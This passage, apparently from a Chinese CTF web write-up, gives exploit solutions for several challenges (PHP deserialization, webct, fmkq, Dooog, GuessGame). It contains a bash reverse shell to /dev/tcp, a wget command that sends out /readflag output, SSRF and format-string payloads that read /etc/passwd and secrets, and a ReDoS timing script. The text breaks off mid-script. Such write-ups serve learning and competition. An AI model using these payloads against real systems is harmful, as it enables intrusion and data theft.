class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $gf;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">content_to_file</span><span class="params">($content)</span></span>&#123;</span><br><span class="line">$passwd = $_GET[<span class="string">'pass'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z]+\.passwd$/m'</span>,$passwd)) </span><br><span class="line">&#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strpos($passwd,<span class="string">"20200202"</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"/"</span>.$content);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aiisc_to_chr</span><span class="params">($number)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(strlen($number)&gt;<span class="number">2</span>)&#123;</span><br><span class="line">$str = <span class="string">""</span>;</span><br><span class="line"> $number = str_split($number,<span class="number">2</span>);</span><br><span class="line"> <span class="keyword">foreach</span> ($number <span class="keyword">as</span> $num ) &#123;</span><br><span class="line"> $str = $str .chr($num);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> strtolower($str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> chr($number);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">calc</span><span class="params">()</span></span>&#123;</span><br><span class="line">$gf=<span class="keyword">$this</span>-&gt;gf;</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/[a-zA-z0-9]|\&amp;|\^|#|\$|%/'</span>, $gf))&#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="string">'$content='</span>.$gf.<span class="string">';'</span>);</span><br><span class="line">  $content =  <span class="keyword">$this</span>-&gt;aiisc_to_chr($content); </span><br><span class="line">  <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content_to_file(<span class="keyword">$this</span>-&gt;calc());</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">unserialize((base64_decode($_GET[<span class="string">'code'</span>])));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最后反序列化读flag <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://121.37.181.246:6333/eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.php?code=Tzo1OiJ0cmljayI6MTp7czoyOiJnZiI7czoyMzoifsfJycrHzcvIy8nLycvIyM/IycnKyM4iO30=&amp;pass=a.passwd%0a20200202</span><br></pre></td></tr></table></figure></p><h2><span id="webct">webct</span></h2><p>有个上传文件的点，和一个连接mysql数据库的点 mysql数据库传入的option参数可控，将其设置为8可以开启MYSQLI_OPT_LOCAL_INFILE。 但是直接读文件失败了，想到构造phar文件让msyql去读取触发反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fileupload</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Listfile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$payload=<span class="keyword">new</span> Listfile();</span><br><span class="line">$payload-&gt;file=<span class="string">'$(bash -c "bash -i &gt;&amp; /dev/tcp/ip/1234 0&gt;&amp;1")'</span>;</span><br><span class="line">$file=<span class="keyword">new</span> Fileupload();</span><br><span class="line">$file-&gt;file=$payload;</span><br><span class="line">unlink(<span class="string">"./phar.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"./phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($file);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span><br><span class="line"></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($file));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上传之后直接用MysqlRouge触发反序列化即可，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">coding=utf<span class="number">-8</span> </span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.basicConfig(level=logging.DEBUG)</span><br><span class="line"></span><br><span class="line">filename=<span class="string">"phar:////var/www/html/uploads/846c8ebb95a1fc1828e4fcc14a8902e0/b4bc4fd46f0e346f2bd105c93c5a1b20.jpg"</span></span><br><span class="line">sv=socket.socket()</span><br><span class="line">sv.bind((<span class="string">""</span>,<span class="number">3309</span>))</span><br><span class="line">sv.listen(<span class="number">5</span>)</span><br><span class="line">conn,address=sv.accept()</span><br><span class="line">logging.info(<span class="string">'Conn from: %r'</span>, address)</span><br><span class="line">conn.sendall(<span class="string">"\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">"auth okay"</span>)</span><br><span class="line">conn.sendall(<span class="string">"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00"</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">"want file..."</span>)</span><br><span class="line">wantfile=chr(len(filename)+<span class="number">1</span>)+<span class="string">"\x00\x00\x01\xFB"</span>+filename</span><br><span class="line">conn.sendall(wantfile)</span><br><span class="line">content=conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(content)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=ip:port&amp;user=user&amp;password=passsword&amp;option=8</span><br></pre></td></tr></table></figure><p>最后/readflag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag：flag&#123;bfa7ea9865f08c320abab5323a1b522c1&#125;</span><br></pre></td></tr></table></figure><h2><span id="fmkq">fmkq</span></h2><p>审计代码可以构造SSRF http://121.37.179.47:1101/?head=&amp;url=xxx.xxx.xxx.xxx</p><p>发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">extract($_GET);</span><br><span class="line">echo sprintf($begin.&apos;%d&apos;,$output);</span><br></pre></td></tr></table></figure><p>传入<code>begin=%s%</code>，可以读到output，于是得到有回显SSRF 扫描内网发现8080端口开放 <img src="https://i.loli.net/2020/03/10/rh1qIpfPWKsXB4U.png" alt="fmkq1.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=http://localhost:8080/read/file=/etc/passwd%26vipcode%3d0&amp;head=\&amp;begin=%s%</span><br></pre></td></tr></table></figure><p>通过这个接口自带的列目录功能可以发现flag在</p><p>但是不能直接读 但是如果file参数传入{file}时会被解析成error，尝试{file.__class__}之后确定后端为python且存在格式化字符串漏洞</p><p>存用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=http://localhost:8080/read/file=&#123;file.__class__.__init__.__globals__[vip].__init__.__globals__&#125;%26vipcode=&#123;file&#125;&amp;head=\&amp;begin=%s%</span><br></pre></td></tr></table></figure><p>可读取到vipcode的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;vipcode&apos;: &apos;uJvFXyqiHnztNQBU10TYkepKjAh7xVMfmgdS4G9r5sWa6loL</span><br></pre></td></tr></table></figure><p>有了vipcode可以读取源码和列目录，知道flag在<code>/fl4g_1s_h3re_u_wi11_rua</code>里，但是读不了，于是读取项目代码，如下：</p><p>/app/base/readfile.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> .vip <span class="keyword">import</span> vip</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,file)</span>:</span></span><br><span class="line">        self.file = file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetName</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">readfile</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        filename = self.GetFileName()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'..'</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">'proc'</span> <span class="keyword">in</span> filename:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"quanbumuda"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                file = open(<span class="string">"/tmp/"</span> + filename, <span class="string">'r'</span>)</span><br><span class="line">                content = file.read()</span><br><span class="line">                file.close()</span><br><span class="line">                <span class="keyword">return</span> content</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"error"</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">r'file=.*?&amp;vipcode=.*?'</span>,data) != <span class="keyword">None</span>:</span><br><span class="line">            data = data.split(<span class="string">'&amp;'</span>)</span><br><span class="line">            data = &#123;</span><br><span class="line">                data[<span class="number">0</span>].split(<span class="string">'='</span>)[<span class="number">0</span>]: data[<span class="number">0</span>].split(<span class="string">'='</span>)[<span class="number">1</span>],</span><br><span class="line">                data[<span class="number">1</span>].split(<span class="string">'='</span>)[<span class="number">0</span>]: data[<span class="number">1</span>].split(<span class="string">'='</span>)[<span class="number">1</span>]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">in</span> data.keys():</span><br><span class="line">                self.file = File(data[<span class="string">'file'</span>])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'vipcode'</span> <span class="keyword">in</span> data.keys():</span><br><span class="line">                self.vipcode = data[<span class="string">'vipcode'</span>]</span><br><span class="line">            self.vip = vip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">not</span> <span class="keyword">in</span> dir(self) <span class="keyword">or</span> <span class="string">'vipcode'</span> <span class="keyword">not</span> <span class="keyword">in</span> dir(self) <span class="keyword">or</span> <span class="string">'vip'</span> <span class="keyword">not</span> <span class="keyword">in</span> dir(self):</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isvip</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.vipcode == self.vip.GetCode():</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetFileName</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.file.GetName()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">current_folder_file = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vipreadfile</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,readfile)</span>:</span></span><br><span class="line">        self.filename = readfile.GetFileName()</span><br><span class="line">        self.path = os.path.dirname(os.path.abspath(self.filename))</span><br><span class="line">        self.file = File(os.path.basename(os.path.abspath(self.filename)))</span><br><span class="line">        <span class="keyword">global</span> current_folder_file</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            current_folder_file = os.listdir(self.path)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            current_folder_file = current_folder_file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'fl4g'</span> <span class="keyword">in</span> self.path:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'nonono,this folder is a secret!!!'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output = <span class="string">'''Welcome,dear vip! Here are what you want:\r\nThe file you read is:\r\n'''</span></span><br><span class="line">            filepath = (self.path + <span class="string">'/&#123;vipfile&#125;'</span>).format(vipfile=self.file)</span><br><span class="line">            output += filepath</span><br><span class="line">            output += <span class="string">'\r\n\r\nThe content is:\r\n'</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f = open(filepath,<span class="string">'r'</span>)</span><br><span class="line">                content = f.read()</span><br><span class="line">                f.close()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                content = <span class="string">'can\'t read'</span></span><br><span class="line">            output += content</span><br><span class="line">            output += <span class="string">'\r\n\r\nOther files under the same folder:\r\n'</span></span><br><span class="line">            output += <span class="string">' '</span>.join(current_folder_file)</span><br><span class="line">            <span class="keyword">return</span> output</span><br><span class="line">```     </span><br><span class="line"></span><br><span class="line">/app/base/vip.py</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vipcode = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vip</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> vipcode</span><br><span class="line">        <span class="keyword">if</span> vipcode == <span class="string">''</span>:</span><br><span class="line">            vipcode = <span class="string">''</span>.join(random.sample(string.ascii_letters+string.digits, <span class="number">48</span>))</span><br><span class="line">            self.truevipcode = vipcode</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.truevipcode = vipcode</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetCode</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.truevipcode</span><br></pre></td></tr></table></figure><p>/app/app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> web</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"><span class="keyword">from</span> base.readfile <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">urls = (</span><br><span class="line">    <span class="string">'/'</span>, <span class="string">'help'</span>,</span><br><span class="line">    <span class="string">'/read/(.*)'</span>,<span class="string">'read'</span></span><br><span class="line">)</span><br><span class="line">web.config.debug = <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">help</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GET</span><span class="params">(self)</span>:</span></span><br><span class="line">        help_information = <span class="string">'''</span></span><br><span class="line"><span class="string">        Welcome to our FMKQ api, you could use the help information below</span></span><br><span class="line"><span class="string">        To read file:</span></span><br><span class="line"><span class="string">            /read/file=example&amp;vipcode=example</span></span><br><span class="line"><span class="string">            if you are not vip,let vipcode=0,and you can only read /tmp/&#123;file&#125;</span></span><br><span class="line"><span class="string">        Other functions only for the vip!!!</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        <span class="keyword">return</span> help_information</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">read</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GET</span><span class="params">(self,text)</span>:</span></span><br><span class="line">        file2read = readfile(text)</span><br><span class="line">        <span class="keyword">if</span> file2read.test() == <span class="keyword">False</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> file2read.isvip() == <span class="keyword">False</span>:</span><br><span class="line">                <span class="keyword">return</span> (<span class="string">"The content of "</span>+ file2read.GetFileName() +<span class="string">" is &#123;file&#125;"</span>).format(file=file2read)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                vipfile2read = vipreadfile(file2read)</span><br><span class="line">                <span class="keyword">return</span> (str(vipfile2read))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app = web.application(urls, globals())</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>path中不能有fl4g，但是读取flag必定会吧上一级当成path， 发现vipfile和file一样存在格式化字符串漏洞，想到构造一个f绕过对fl4g的过滤， payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=http://localhost:8080/read/file=&#123;vipfile.__class__.__init__.__globals__[vipreadfile].__module__[9]&#125;l4g_1s_h3re_u_wi11_rua/flag%26vipcode=uJvFXyqiHnztNQBU10TYkepKjAh7xVMfmgdS4G9r5sWa6loL&amp;head=\&amp;begin=%s%</span><br></pre></td></tr></table></figure><p>flag: flag{qoSF2nKvwoGRI7aJ}</p><h2><span id="dooog">Dooog</span></h2><p>通读代码，看起来是个kerberos协议 核心就是伪造一个时间戳，绕过对cmd的验证 <img src="https://i.loli.net/2020/03/10/1WcsSOX9FDmMe6l.png" alt="dooog1.png"> 然后直接/readflag exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    username =&quot;xishir&quot;</span><br><span class="line">    master_key = &quot;12345678&quot;</span><br><span class="line">    cmd = &quot;wget xxxx/`/readflag`&quot;</span><br><span class="line">    cryptor = AESCipher(master_key)</span><br><span class="line">    authenticator = cryptor.encrypt(json.dumps(&#123;&apos;username&apos;:username, &apos;timestamp&apos;: int(time.time())&#125;))</span><br><span class="line">    res = requests.post(&apos;http://121.37.164.32:5001/getTGT&apos;, data=&#123;&apos;username&apos;: username, &apos;authenticator&apos;: base64.b64encode(authenticator)&#125;)</span><br><span class="line">    print res.text</span><br><span class="line">    session_key, TGT = cryptor.decrypt(base64.b64decode(res.content.split(&apos;|&apos;)[0])), res.content.split(&apos;|&apos;)[1]</span><br><span class="line">    cryptor = AESCipher(session_key)</span><br><span class="line">    authenticator = cryptor.encrypt(json.dumps(&#123;&apos;username&apos;: username, &apos;timestamp&apos;: int(time.time())-61&#125;))</span><br><span class="line">    res = requests.post(&apos;http://121.37.164.32:5001/getTicket&apos;,  data=&#123;&apos;username&apos;: username, &apos;cmd&apos;: cmd, &apos;authenticator&apos;: base64.b64encode(authenticator), &apos;TGT&apos;: TGT&#125;)</span><br><span class="line">    print res.text</span><br><span class="line">    client_message, server_message = res.content.split(&apos;|&apos;)</span><br><span class="line"></span><br><span class="line">    session_key = cryptor.decrypt(base64.b64decode(client_message))</span><br><span class="line">    </span><br><span class="line">    cryptor = AESCipher(session_key)</span><br><span class="line">    authenticator = base64.b64encode(cryptor.encrypt(username))</span><br><span class="line">    res = requests.post(&apos;http://121.37.164.32:5002/cmd&apos;, data=&#123;&apos;server_message&apos;: server_message, &apos;authenticator&apos;: authenticator&#125;)</span><br></pre></td></tr></table></figure><h2><span id="guessgame">GuessGame</span></h2><p>http://121.37.179.47:8081/static/app.js 有后端源码</p><p>用<code>ADmin888</code>大小写绕过admin的检查， merge存在原型链污染，可以把config.enableReg改成true， 构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;user&quot;:&#123;&quot;username&quot;:&quot;ADmin888&quot;,&quot;__proto__&quot;: &#123;&quot;enableReg&quot;: true&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>然后可以控制进行一次正则匹配，因为没有任何回显，猜测是要redos进行延时盲注 <img src="https://i.loli.net/2020/03/10/3An2NUWVeRxYp1z.png" alt="guess.png"></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">flag = <span class="string">"g3"</span></span><br><span class="line">ext = <span class="string">"zY"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    alls = []</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> <span class="string">"&#123;&#125;_0123456789abcdefghijklmnopqestuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>:</span><br><span class="line">        t = time.time()</span><br><span class="line">        headers = &#123;<span class="string">'Content-Type'</span>: <span class="string">'application/json'</span>&#125;</span><br><span class="line">        payload = <span class="string">"""&#123;"q":"^((.*)+)+[^%s]%s$","tmp":"%d"&#125;"""</span> % (f, ext, t)</span><br><span class="line">        <span class="comment">#payload = """&#123;"q":"^(((.*)+?)+?)+?[^%s]%s$","tmp":"%d"&#125;""" % (f, ext, 